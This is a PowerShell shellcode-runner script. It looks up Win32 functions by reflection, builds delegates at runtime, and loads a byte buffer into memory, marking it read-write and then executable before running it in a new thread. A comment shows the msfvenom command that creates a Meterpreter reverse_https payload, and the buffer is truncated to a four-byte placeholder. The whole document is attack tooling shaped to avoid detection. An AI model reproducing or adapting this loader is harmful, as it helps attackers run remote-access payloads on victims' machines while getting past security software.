Function Standard_Shellcode_Runner_Delegate_Dynamic {

    function Invoke-FunctionLookup {
        Param (
            [Parameter(Position = 0, Mandatory = $true)] 
            [string] $moduleName,

            [Parameter(Position = 1, Mandatory = $true)] 
            [string] $functionName
        )

        $systemType = ([AppDomain]::CurrentDomain.GetAssemblies() | 
            Where-Object { $_.GlobalAssemblyCache -and $_.Location.Split('\\')[-1] -eq 'System.dll' }
        ).GetType('Microsoft.Win32.UnsafeNativeMethods')

        $getProcAddressMethod = $systemType.GetMethods() | 
        Where-Object { $_.Name -eq "GetProcAddress" }

        $moduleHandle = $systemType.GetMethod('GetModuleHandle').Invoke($null, @($moduleName))

        return $getProcAddressMethod[0].Invoke($null, @($moduleHandle, $functionName))
    }

    function Invoke-GetDelegate {
        Param (
            [Parameter(Position = 0, Mandatory = $true)] 
            [Type[]] $parameterTypes,

            [Parameter(Position = 1, Mandatory = $false)] 
            [Type] $returnType = [Void]
        )

        $assemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
            (New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
            [System.Reflection.Emit.AssemblyBuilderAccess]::Run
        )

        $moduleBuilder = $assemblyBuilder.DefineDynamicModule('InMemoryModule', $false)

        $typeBuilder = $moduleBuilder.DefineType(
            'MyDelegateType', 
            [System.Reflection.TypeAttributes]::Class -bor 
            [System.Reflection.TypeAttributes]::Public -bor 
            [System.Reflection.TypeAttributes]::Sealed -bor 
            [System.Reflection.TypeAttributes]::AnsiClass -bor 
            [System.Reflection.TypeAttributes]::AutoClass, 
            [System.MulticastDelegate]
        )

        $constructorBuilder = $typeBuilder.DefineConstructor(
            [System.Reflection.MethodAttributes]::RTSpecialName -bor 
            [System.Reflection.MethodAttributes]::HideBySig -bor 
            [System.Reflection.MethodAttributes]::Public,
            [System.Reflection.CallingConventions]::Standard,
            $parameterTypes
        )

        $constructorBuilder.SetImplementationFlags(
            [System.Reflection.MethodImplAttributes]::Runtime -bor 
            [System.Reflection.MethodImplAttributes]::Managed
        )

        $methodBuilder = $typeBuilder.DefineMethod(
            'Invoke',
            [System.Reflection.MethodAttributes]::Public -bor 
            [System.Reflection.MethodAttributes]::HideBySig -bor 
            [System.Reflection.MethodAttributes]::NewSlot -bor 
            [System.Reflection.MethodAttributes]::Virtual,
            $returnType,
            $parameterTypes
        )

        $methodBuilder.SetImplementationFlags(
            [System.Reflection.MethodImplAttributes]::Runtime -bor 
            [System.Reflection.MethodImplAttributes]::Managed
        )

        return $typeBuilder.CreateType()
    }

    # msfvenom.bat -p windows/x64/meterpreter/reverse_https LHOST=127.0.0.1 LPORT=7710 -f powershell EXITFUNC=thread
    [Byte[]] $buf = 0xfc,0x48,0x83,0xe4
    $size = $buf.Length

    # Allocate memory in the current process for the shellcode execution
    $virtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (Invoke-FunctionLookup -moduleName "kernel32.dll" -functionName "VirtualAlloc"), 
        (Invoke-GetDelegate @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))
    )
    
    # Step 1: Allocate memory with PAGE_READWRITE permissions
    $addr = $virtualAlloc.Invoke([IntPtr]::Zero, $size, 0x3000, 0x04)

    # Copy the shellcode into the allocated memory
    [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)

    # Step 2: Change memory protection to PAGE_EXECUTE_READ using VirtualProtect
    $virtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (Invoke-FunctionLookup -moduleName "kernel32.dll" -functionName "VirtualProtect"), 
        (Invoke-GetDelegate @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Boolean]))
    )
    
    $OldProtect = 0
    $virtualProtect.Invoke($addr, $size, 0x20, [ref]$OldProtect) > $null

    # Create a new thread to execute the shellcode
    $createThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (Invoke-FunctionLookup -moduleName "kernel32.dll" -functionName "CreateThread"), 
        (Invoke-GetDelegate @([IntPtr], [UInt32], [IntPtr], [IntPtr], [Uint32], [IntPtr]) ([IntPtr]))
    )
    
    $thread = $createThread.Invoke([IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)

    try {
        # Wait for the thread to finish executing
        $waitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
            (Invoke-FunctionLookup -moduleName "kernel32.dll" -functionName "WaitForSingleObject"), 
            (Invoke-GetDelegate @([IntPtr], [UInt32]) ([UInt32]))
        )
        
        $waitForSingleObject.Invoke($thread, [uint32]::MaxValue) > $null
    }
    Catch {}

}

Standard_Shellcode_Runner_Delegate_Dynamic
